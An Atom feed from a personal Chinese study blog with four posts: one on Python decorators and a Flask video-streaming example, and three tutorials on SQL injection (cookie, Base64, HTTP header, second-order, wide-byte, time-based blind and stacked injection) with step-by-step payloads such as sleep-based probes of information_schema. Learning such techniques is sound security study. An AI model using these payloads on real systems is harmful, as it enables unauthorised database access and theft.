<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Robin</title>
  
  <subtitle>LiuGuobin&#39;s blog</subtitle>
  <link href="https://liu1272.github.io/atom.xml" rel="self"/>
  
  <link href="https://liu1272.github.io/"/>
  <updated>2023-03-18T17:26:43.963Z</updated>
  <id>https://liu1272.github.io/</id>
  
  <author>
    <name>liuGuobin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python装饰器&amp;流处理技术</title>
    <link href="https://liu1272.github.io/2023/03/18/Python%E8%A3%85%E9%A5%B0%E5%99%A8-%E6%B5%81%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF/"/>
    <id>https://liu1272.github.io/2023/03/18/Python%E8%A3%85%E9%A5%B0%E5%99%A8-%E6%B5%81%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF/</id>
    <published>2023-03-17T16:56:00.000Z</published>
    <updated>2023-03-18T17:26:43.963Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Python装饰器"><a href="#Python装饰器" class="headerlink" title="Python装饰器"></a>Python装饰器</h3><h4 id="解释概念"><a href="#解释概念" class="headerlink" title="解释概念"></a>解释概念</h4><p>Python中的装饰器是一种用于修改或扩展函数或类的行为的语法结构。装饰器通常是一个函数或类，它接受一个函数或类作为参数，并返回一个新的函数或类。</p><p>装饰器可以用于许多不同的目的，例如：</p><ol><li>添加日志记录或调试信息，以便跟踪函数的执行过程和结果。</li><li>对函数或类的参数进行验证或修改，以确保它们符合特定的规则或格式。</li><li>对函数或类进行缓存或记忆化，以避免重复计算或提高性能。</li><li>添加身份验证或授权逻辑，以确保只有授权用户才能调用函数或类。</li><li>实现面向切面编程（AOP），以分离横切关注点（如日志记录、性能统计等）和业务逻辑。<br>Python中的装饰器使用@语法来应用，例如：<pre class="line-numbers language-python"><code class="language-python">@decorator<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># do something</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>这将把<code>my_function</code>函数传递给<code>decorator</code>装饰器函数，并将其替换为新的函数，该函数包装了原始函数并修改了其行为。</li></ol><h4 id="关于装饰器全局变量的使用（接口）"><a href="#关于装饰器全局变量的使用（接口）" class="headerlink" title="关于装饰器全局变量的使用（接口）"></a>关于装饰器全局变量的使用（接口）</h4><p>装饰器本质上是一个函数，因此它可以访问任何全局变量。<br>当在装饰器中使用全局变量时，需要注意以下几点：</p><ol><li>在装饰器中声明全局变量需要使用<code>global</code>关键字。</li><li>在装饰器中使用全局变量，需要确保该变量已经被定义和初始化，否则会引发<code>NameError</code>异常。</li><li>全局变量可能会被多个线程或进程访问，因此需要考虑并发安全问题。</li><li>在装饰器中使用全局变量可能会导致代码的可读性和可维护性降低，因此应尽可能避免使用全局变量。<br>以下是一个简单的例子，演示如何在装饰器中使用全局变量：<pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">counter</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">global</span> count     count <span class="token operator">+=</span> <span class="token number">1</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; was called &amp;#123;count&amp;#125; times."</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span> <span class="token keyword">return</span> wrapper@counter<span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello, world!"</span><span class="token punctuation">)</span>foo<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Function foo was called 1 times.</span>foo<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Function foo was called 2 times.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>在上面的例子中，我们定义了一个全局变量<code>count</code>，并在装饰器<code>counter</code>中使用了它。<br>装饰器<code>counter</code>用于统计函数被调用的次数，每次调用时<code>count</code>加1，并输出调用次数。<br>函数<code>foo</code>被装饰后，每次调用都会输出调用次数。</li></ol><p>除了在装饰器函数内部使用 <code>global</code> 关键字，还可以在装饰器函数外部使用 <code>global</code> 关键字来声明全局变量，并在装饰器内部访问和修改该变量的值：</p><pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">count_calls</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> count        count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; has been called &amp;#123;count&amp;#125; times"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    <span class="token keyword">return</span> wrapper@count_calls<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> count    <span class="token keyword">if</span> count <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hi there!"</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们声明了全局变量 <code>count</code>，并在装饰器内部和外部使用了 <code>global</code> 关键字。<br>在 <code>my_function</code> 函数内部，我们检查 <code>count</code> 的值是否为偶数，并打印不同的消息。<br>由于装饰器在每次调用 <code>my_function</code> 函数时都会增加 <code>count</code> 的值，因此 <code>my_function</code> 函数每次都会打印不同的消息。</p><p>需要注意的是，在使用全局变量时要小心，因为全局变量可能会在代码中的任何地方进行修改，这可能会导致出现意外的行为。<br>因此，最好将全局变量用于只读目的，或者在使用时采用适当的同步机制来避免竞争条件。<br>当然，除了 <code>global</code> 关键字之外，还可以使用其他的方式来在装饰器中引用外部变量。以下是一些常用的方法：</p><ol><li>使用闭包：在装饰器函数内部定义一个内部函数，并在内部函数中引用外部变量<br>（由于内部函数可以访问外部函数的变量）</li><li>使用类：将装饰器实现为一个类，并在类中引用外部变量<br>（由于类实例可以存储变量状态）</li></ol><p>无论是使用 <code>global</code> 关键字、闭包还是类，都可以在装饰器中引用外部变量。<br>除了上面所提到的方法，还可以将变量作为参数传递给装饰器。<br>这种方式通常适用于装饰器函数需要访问某些变量，但不希望将这些变量声明为全局变量的情况。</p><p>通过将变量作为参数传递给装饰器，我们可以更灵活地控制装饰器的行为，但同时也会增加代码的复杂度。因此，在选择使用这种方式时，需要权衡利弊，并根据具体的情况选择最适合的实现方式。</p><p>除了在装饰器中使用 <code>global</code> 关键字、闭包、类或参数等方式引用外部变量之外，还可以使用 <code>functools</code> 模块中的 <code>wraps</code> 装饰器来保留被装饰函数的元信息。<br>具体来说，<code>wraps</code> 装饰器可以用来保留被装饰函数的名称、文档字符串、参数签名等元信息，从而使得被装饰函数更加易于调试和理解。</p><h3 id="流处理技术"><a href="#流处理技术" class="headerlink" title="流处理技术"></a>流处理技术</h3><h4 id="概念解析"><a href="#概念解析" class="headerlink" title="概念解析"></a>概念解析</h4><p>流处理技术是一种处理数据的方式，它是指持续接收和处理流式数据的方式。<br>与批处理不同，流处理将数据视为连续的数据流，而不是离散的数据集合。</p><h4 id="应用领域"><a href="#应用领域" class="headerlink" title="应用领域"></a>应用领域</h4><p>流处理技术的主要用途是实时分析和处理数据。<br>通过流处理技术，可以快速处理大量的<code>实时数据</code>，并从中提取有价值的信息。<br>流处理技术通常使用流处理引擎来实现，流处理引擎通常提供一系列的API和工具。<br>用于处理数据流、实时处理和聚合数据、分析数据和发送数据到其他系统。<br>流处理引擎还可以与其他系统和工具集成，例如数据库、数据仓库、消息队列等。</p><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>在使用流处理技术时，需要考虑以下几个方面：<br>（1）数据来源和输入方式：从不同的数据源中读取实时数据流。<br>（2）流处理引擎的选择：根据具体的业务需求和系统架构选择适合的流处理引擎。<br>&emsp;&emsp;(Apache Flink、Apache Kafka Streams、Apache Spark Streaming等)<br>（3）数据处理逻辑：定义数据处理逻辑。<br>（4）数据输出方式：传输和存储处理后的数据。</p><h4 id="简单的示例"><a href="#简单的示例" class="headerlink" title="简单的示例"></a>简单的示例</h4><p>下面是个使用Flask和cv2框架编写的一个用于播放视频的Python流处理脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response<span class="token keyword">import</span> cv2app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>camera <span class="token operator">=</span> cv2<span class="token punctuation">.</span>VideoCapture<span class="token punctuation">(</span><span class="token string">"1.mp4"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">generate_frames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        success<span class="token punctuation">,</span> frame <span class="token operator">=</span> camera<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> success<span class="token punctuation">:</span>            ret<span class="token punctuation">,</span> buffer <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imencode<span class="token punctuation">(</span><span class="token string">'.jpg'</span><span class="token punctuation">,</span> frame<span class="token punctuation">)</span>            frame <span class="token operator">=</span> buffer<span class="token punctuation">.</span>tobytes<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">yield</span> <span class="token punctuation">(</span>b<span class="token string">'--frame\r\nContent-Type: image/jpeg\r\n\r\n'</span> <span class="token operator">+</span> buffer<span class="token punctuation">.</span>tobytes<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'\r\n'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">video_feed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> Response<span class="token punctuation">(</span>generate_frames<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>mimetype<span class="token operator">=</span><span class="token string">'multipart/x-mixed-replace;boundary=frame'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2023/03/19/cQ87hagSwpFA3CE.jpg" alt="效果就这样"><br>但是这样子做出来的很大缺陷:<br>1.没办法调倍速<br>2.没声音<br>3.不能循环播放之类的</p><p>但是，要想解决上面这些问题只需要再添加两行代码！！！<br>一行代码启动docker版nginx-rtmp服务<br>另一行代码使用FFmpeg推流，指定服务器地址<br>（我没试过，出问题别找我）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Python装饰器&quot;&gt;&lt;a href=&quot;#Python装饰器&quot; class=&quot;headerlink&quot; title=&quot;Python装饰器&quot;&gt;&lt;/a&gt;Python装饰器&lt;/h3&gt;&lt;h4 id=&quot;解释概念&quot;&gt;&lt;a href=&quot;#解释概念&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Cookie/Base64/HTTP头部注入</title>
    <link href="https://liu1272.github.io/2023/03/15/cookie%E6%B3%A8%E5%85%A5/"/>
    <id>https://liu1272.github.io/2023/03/15/cookie%E6%B3%A8%E5%85%A5/</id>
    <published>2023-03-15T14:30:00.000Z</published>
    <updated>2023-03-17T05:30:58.644Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>常见于&emsp;.asp?id=xx&emsp;之类的带参数的URL</p><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>cookie是一些数据信息，类型为“小型文本文件”，存储于电脑上的文本文件中。<br>cookie是服务器创建后返回给游览器的。游览器只进行了保存。<br> 一般cookie是以键值对进行表示的(key-value)</p><pre><code>cookie常用属性的解释：       Name： cookie的名字       Value： cooke的值       Path： 定义了Web站点上可以访问该Cookie的目录       Expires： 表示cookie的过期时间，也就是有效值       Size： 表示cookie的大小</code></pre><p>cookie有2种存储方式，会话性（关浏览器就清除）和持久性（保留到有效期结束）</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>ASP脚本中的request对象，被用于从用户那里获取信息。<br>Request对象的使用方法：request.[集合名称]（参数名称）<br>但是它同时允许提交时省略集合名称<br>按QueryString、Form、Cookies、ServerVariables的顺序来获取数据的<br>所以，当未指明使用request对象的具体方法进行获取且未过滤语句时存在注入。</p><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><p>（1）寻找.asp?id=xx这样的页面<br>（2）将“id=xx”删掉，看页面是否正常。不正常则说明参数在数据传递中启直接作用<br>（3）清空网址，输入</p><pre><code>javascript:alert(document.cookie=“id=”+escape(“xx”));document.cookie:表示当前浏览器中的cookie变量alert():弹出一个对话框escape():对字符串进行编码</code></pre><p>&emsp;&emsp;按Enter键后弹出一个对话框，内容是“id=xx”<br>&emsp;&emsp;然后重新输入原来URL回车<br>&emsp;&emsp;如果显示正常，说明是用Request(“id”)方式获取数据<br>（4）判断是否存在漏洞:将SQL判断语句带入，并重复第三步</p><pre><code>javascript:alert(document.cookie=“id=”+escape(“xx and 1=1”));javascript:alert(document.cookie=“id=”+escape(“xx and 1=2”));两次回显不一样则说明存在注入漏洞，并可以进行cookie注入</code></pre><p>（5）代入SQL语句</p><pre><code>javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;xx order by 2&quot;));javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;284 union select 1,…… from xx&quot;));</code></pre><h3 id="Base64注入"><a href="#Base64注入" class="headerlink" title="Base64注入"></a>Base64注入</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>程序对GET的传参进行接收，并且对其进行解码，然后再放入查询语句中。<br>这时候我们可以编码，然后程序执行的时候，会把我们所编码的注入语句解码，再拼接到了原本程序要执行的代码中</p><h4 id="讲解"><a href="#讲解" class="headerlink" title="讲解"></a>讲解</h4><p>Base64注入实质上并不是一个全新的注入手段，而是一种对数据处理的方法。<br>Base64注入可以发生在cookie注入中，只要有</p><pre><code>$id = base64_decode($_GET[&#39;id&#39;]);</code></pre><p>这个函数语句，就会发生Base64的解码，甚至可以加解密成其他的格式<br>此时就需要一个个试或者进行白盒测试了。</p><h3 id="最后总结一下HTTP头部注入"><a href="#最后总结一下HTTP头部注入" class="headerlink" title="最后总结一下HTTP头部注入"></a>最后总结一下HTTP头部注入</h3><p>原理:后台开发人员为了验证客户端HTTP Header（比如常用的Cookie验证等）或者通过HTTP Header头信息获取客户端的一些信息（例如：User-Agent、Accept字段等），会对客户端HTTP Header 进行获取并使用SQL语句进行处理，如果此时没有足够的安全考虑，就可能导致基于HTTP Header的注入漏洞</p><p>使用HTTP头部注入漏洞的前提条件:<br>（1）能够对请求头消息进行修改<br>（2）修改的请求头信息能够带入数据库执行<br>（3）数据库没有对输入的请求头做过滤</p><p>常见方法:<br>Cookie注入<br>User-Agent注入<br>Referer注入<br>XFF注入（X-Forwarded-For）</p><p>如果要详细了解请自行查询。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Cookie注入&quot;&gt;&lt;a href=&quot;#Cookie注入&quot; class=&quot;headerlink&quot; title=&quot;Cookie注入&quot;&gt;&lt;/a&gt;Cookie注入&lt;/h3&gt;&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL二次注入&amp;宽字节注入</title>
    <link href="https://liu1272.github.io/2023/03/13/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    <id>https://liu1272.github.io/2023/03/13/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</id>
    <published>2023-03-12T16:15:00.000Z</published>
    <updated>2023-03-13T16:43:35.294Z</updated>
    
    <content type="html"><![CDATA[<h3 id="SQL二次注入"><a href="#SQL二次注入" class="headerlink" title="SQL二次注入"></a>SQL二次注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>在二次注入中，一般不会是单纯的二次注入<br>通常会与报错注入或Bool盲注结合。<br>比如，在注册页面输入的用户名在登录后才有盲注的回显<br>这时候我们需要自己编写脚本模拟注册及登录。</p><p>无法通过扫描工具或者手工测试出来，二次注入一般在审计代码过程中发现<br>从前端或黑盒测试无法看到</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>攻击者构造恶意的数据并存储在数据库后<br>防御者对语句中的特殊字符进行了转义处理<br>但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中<br>当程序调用恶意数据并执行SQL查询时就发生了SQL二次注入。<br>总而言之:<br>用户输入恶意的数据库查询语句时会被转义，<br>但在数据库调用读取语句时又被还原导致语句执行。</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p><strong>第一步：构造恶意语句</strong><br>没有恶意代码怎么能行？先上传含有能被转义的字符的恶意查询语句<br><strong>第二步：插入恶意数据</strong><br>传入数据并任他对其中特殊字符进行转义处理，但在保存在数据库时<strong>保留了原来的味道</strong><br><strong>第三步：二次构造语句，引用恶意数据</strong><br>因为开发者默认存在数据库里的数据都是安全的<br>所以在进行查询时，直接从数据库中取出九转大肠<br>结果如下:<br><img src="https://s2.loli.net/2023/03/13/wrX4BSlGyjPmqgH.jpg" alt="只保留了一点原始的味道"></p><h4 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h4><h5 id="构造并存入一个恶意语句"><a href="#构造并存入一个恶意语句" class="headerlink" title="构造并存入一个恶意语句"></a>构造并存入一个恶意语句</h5><p>由于这种注入太难以被判断及发现，所以本文只作简单说明(其实是因为我太菜了)</p><pre><code>在注册等类似能上传并存储数据的页面存入admin&#39;#mysql_escape_string()等函数会在特殊字符前加 \ 造成过滤的效果</code></pre><p>此时传入时不会执行恶意代码，因为它过滤了。<br>但是存入的时候没有更改原来的数据。</p><h5 id="调用数据库中的恶意语句"><a href="#调用数据库中的恶意语句" class="headerlink" title="调用数据库中的恶意语句"></a>调用数据库中的恶意语句</h5><p>既然原来的数据没改，那就再调出来用(相当于执行了恶意代码)。</p><pre><code>下面是sqllab靶场的题，二次执行时整个语句变成了这样子update password=$new where username=admin&#39;#</code></pre><p>admin后引号对前面的单引号进行了闭合，#注释掉了后面的语句，就相当于对admin进行了改密</p><h3 id="SQL宽字节注入"><a href="#SQL宽字节注入" class="headerlink" title="SQL宽字节注入"></a>SQL宽字节注入</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>**单字节字符集:**所有的字符都使用一个字节来表示（ASCII 编码0-127）<br>**多字节字符集:**在多字节字符集中，用多个字节来表示（也有可能一部分用一个字节表示）<br>**宽字符:**用多个字节来代表的字符称之为宽字符<br>**字符、字符集:**字符是组成字符集的基本单位<br>**UTF8:**由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF。<br>**宽字节:**GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。</p><h4 id="表现-1"><a href="#表现-1" class="headerlink" title="表现"></a>表现</h4><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>1、宽字节注入是利用mysql的一个特性:<br>&emsp;&emsp;PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为\）<br>&emsp;&emsp;MYSQL默认字符集是GBK等宽字节字符集。<br>2、PHP发送请求到mysql，mysql在使用GBK编码的时候会认为两个字符是一个汉字<br>3、字符和转义的反斜杠组成了新的汉字，但是组成的新汉字又不是一个正常的汉字，就起到了注掉 \ 的作用</p><h4 id="转义函数"><a href="#转义函数" class="headerlink" title="转义函数"></a>转义函数</h4><pre><code>addslashes函数:对单引号(’)、双引号(&quot;)、反斜线(\)与x00 (NULL字符）magic_quotes_gpc函数:判断解析用户提交的数据，有post、get、cookie数据时增加转义字符“\”mysql_real_escape_string函数mysql_escape_string函数</code></pre><h4 id="注入方法-1"><a href="#注入方法-1" class="headerlink" title="注入方法"></a>注入方法</h4><p>方法一:<br>比如and’的编码是%df’，传参时单引号被加上\变成了 %df&#39;<br>其中\的十六进制是%5C ，那么现在 %df&#39; =%df%5c%27<br>如果程序的默认字符集是GBK等宽字节字符集<br>则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗</p><pre><code>也就是说:%df\&#39; = %df%5c%27=縗&#39;</code></pre><p>我们再回想到注入的三要素，有了单引号(闭合)后就好注入了</p><p>方法二:<br>使用汉字绕过。<br>PHP接收到一个汉字后通过UTF-8编码（三字节），并和\两两配对组成两个汉字，避免了后面引号的转义</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;SQL二次注入&quot;&gt;&lt;a href=&quot;#SQL二次注入&quot; class=&quot;headerlink&quot; title=&quot;SQL二次注入&quot;&gt;&lt;/a&gt;SQL二次注入&lt;/h3&gt;&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL时间注入&amp;堆叠注入</title>
    <link href="https://liu1272.github.io/2023/03/12/SQL%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5/"/>
    <id>https://liu1272.github.io/2023/03/12/SQL%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5/</id>
    <published>2023-03-12T15:11:00.000Z</published>
    <updated>2023-03-12T16:41:31.525Z</updated>
    
    <content type="html"><![CDATA[<h3 id="SQL时间注入"><a href="#SQL时间注入" class="headerlink" title="SQL时间注入"></a>SQL时间注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>无论输入什么都会返回正常的处理信息或者页面无回显<br>能依靠自身感知到页面的延时情况</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>前端在将数据传给后台时，设置了一个if语句<br>当条件为真时执行sleep语句，条件为假时无执行语句</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>时间注入又称延时注入，与布尔盲注同属于盲注无回显的类型。<br>如果想要注入，必不可少的是得看得到效果。<br>那么有没有什么方法能直接或是间接地显示或猜解出数据呢？<br>当然有！前面就已近提到过函数这个东西了。<br>函数与and结合时，如果传入的参数正确就会触发函数，否则不执行。<br>此时将函数与查询语句结合后再与传入的参数结合就能达到最终效果了。</p><h4 id="相关函数讲解"><a href="#相关函数讲解" class="headerlink" title="相关函数讲解"></a>相关函数讲解</h4><pre><code>if(a,b,c)                如果a是TRUE(a!=0或a!=NULL)，则返回b，否则返回csleep(x)                 延时x秒if(a,b,c)                a为真，执行b；否则执行cbenchmark(a,b)           a为操作次数，b为执行的函数                         原理是通过多次操作，让极短暂的延时增加到能识别的程度                         后面几个都是这种思想笛卡尔积                  别问，老子离散数学还没学到这！get_lock(key, timeout)   key(最好是数字)指定名称获取锁，timeout指定锁定时间                         前提条件是数据库连接是长连接正则bug                  利用大量正则计算延长时间，实现延时除此之外还有case … when … then … else … end</code></pre><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="判断是否存在注入点及注入的类型"><a href="#判断是否存在注入点及注入的类型" class="headerlink" title="判断是否存在注入点及注入的类型"></a>判断是否存在注入点及注入的类型</h5><pre><code>?id=1?id=5?id=5&#39;?id=5&quot;?id=5 and 1=1?id=5 and 1=2</code></pre><p>如果页面显示结果一样，那就说明可能是延时注入</p><h5 id="获取库长度"><a href="#获取库长度" class="headerlink" title="获取库长度"></a>获取库长度</h5><pre><code>?id=1 and if(length(database())&lt;10,sleep(5),1)?id=1 and if(length(database())=4,sleep(5),1)</code></pre><p>如果第一个没有延时，但是第二个有5秒延时则表名数据库名长度为4</p><h5 id="获取库名、表名、字段名及字段内容"><a href="#获取库名、表名、字段名及字段内容" class="headerlink" title="获取库名、表名、字段名及字段内容"></a>获取库名、表名、字段名及字段内容</h5><pre><code>爆数据库名?id=1 and if(ascii(substr(database(),1,1))=106,sleep(5),1)测试表数量?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())&lt;5测试第一张表长度?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;10测试表名?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;100测试表中字段数量?id=1 and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273)=5测试字段内容?id=1 and (select count(name) from users)=4</code></pre><p>这时候你会发现这就是布尔盲注的做法<br>一个一个跑咯，懒得细细讲解了</p><h3 id="SQL堆叠注入"><a href="#SQL堆叠注入" class="headerlink" title="SQL堆叠注入"></a>SQL堆叠注入</h3><h4 id="表现-1"><a href="#表现-1" class="headerlink" title="表现"></a>表现</h4><p>跟联合查询注入差不多，两个方式相应的真假值都有不同的回显。</p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>在SQL中，分号表示一条 sql 语句的结束。<br>在分号后继续构造下一条语句，就会把两条语句一起执行。<br><strong>联合注入</strong>也是将两条语句合并在一起，两者之间有什么区别么？<br>union执行的语句类型是有限的，而堆叠注入可以执行任意语句。</p><h4 id="开始注入-1"><a href="#开始注入-1" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="检查注入点及回显位"><a href="#检查注入点及回显位" class="headerlink" title="检查注入点及回显位"></a>检查注入点及回显位</h5><pre><code>?id=1&#39;?id=1&#39; and 1=1--+?id=1&#39; and 1=2--+</code></pre><h5 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h5><p>方法前面都有讲，回去抄payload就行了<br>加入分号，再接一个SQL语句看是否能显出结果。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p>今天不讲一句，讲一段话。</p><p><strong>人像摄影，更强调人物本身的特点，仿佛这个人就在你面前一样。<br>但是每个人不同的身高决定了站立时必定不能拍出完美的图片。<br>因此，拍人像时，最简单的一个办法就是用跟他们同样的视角拍摄，<br>这样才能看见他们更多的表情、神态和动作。<br>你才能看到他们的世界，画面才会更有吸引力。</strong></p>]]></content>
    
    
      
      
